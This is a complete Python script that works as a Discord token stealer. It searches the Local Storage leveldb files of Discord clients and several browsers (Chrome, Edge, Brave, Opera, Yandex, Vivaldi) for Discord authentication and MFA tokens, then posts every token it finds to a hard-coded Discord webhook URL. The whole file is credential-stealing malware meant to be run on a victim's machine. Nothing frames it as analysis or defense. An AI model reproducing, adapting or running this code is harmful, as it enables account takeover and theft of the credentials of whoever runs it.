import os
import re
import json
import requests
WEBHOOK_URL = 'https://discord.com/api/webhooks/1019255104551006269/NEHY5OWUR-iPcCLK259B3KKEgnG16hi0GgyvftthQ4GZdv4RtJdHARvoPzEICWMWVNH-'

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    path = os.getenv('APPDATA')
    local = os.getenv('LOCALAPPDATA')

    paths = {
        'Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Discord': path + '\\Discord',
        'Discord Canary': path + '\\discordcanary',
        'Discord PTB': path + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': path + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'LightCord': path + '\\Lightcord',
        'OperaGX': path + '\\Opera Software\\Opera GX Stable'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message = f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
                
        else:
            message += 'No tokens found.\n'
            

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36'
    }


    payload = json.dumps({'content': message})

    try:
        requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
    except:
        pass
        
if __name__ == "__main__":        
    main()